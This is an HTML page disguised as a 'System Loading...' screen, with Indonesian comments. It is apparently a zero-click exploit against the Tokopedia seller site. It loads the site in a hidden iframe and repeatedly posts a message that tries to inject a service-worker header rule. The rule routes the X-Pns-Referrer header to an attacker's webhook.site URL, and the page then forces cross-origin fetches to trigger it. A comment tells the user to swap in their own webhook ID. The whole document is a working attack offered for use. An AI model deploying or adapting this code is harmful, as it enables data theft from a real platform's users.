<!DOCTYPE html>
<html>
<head><title>System Loading...</title></head>
<body>
    <iframe id="target_frame" src="https://shop-id.tokopedia.com/" style="display:none;"></iframe>

    <script>
        const frame = document.getElementById('target_frame');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // Ganti ID Webhook lu

        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "zero_click_final",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook
                }]
            }]
        };

        function attemptInjection() {
            try {
                // Mengirim pesan ke contentWindow Iframe
                frame.contentWindow.postMessage(payload, "*");
                console.log("Payload sent...");
            } catch (e) {
                console.log("Retrying...");
            }
        }

        // Jalankan injeksi berkali-kali untuk memastikan SW menangkapnya
        const interval = setInterval(attemptInjection, 500);

        // Berhenti setelah 10 detik dan paksa pemicuan fetch
        setTimeout(() => {
            clearInterval(interval);
            console.log("Triggering fetch event...");
            
            // Cara paling ampuh trigger SW fetch tanpa klik: Image tag cross-origin
            const img = new Image();
            img.src = "https://shop-id.tokopedia.com/favicon.ico?cache=" + Math.random();
            
            // Atau fetch via script
            fetch("https://shop-id.tokopedia.com/robots.txt", { mode: 'no-cors' });
        }, 10000);
    </script>
</body>
</html>
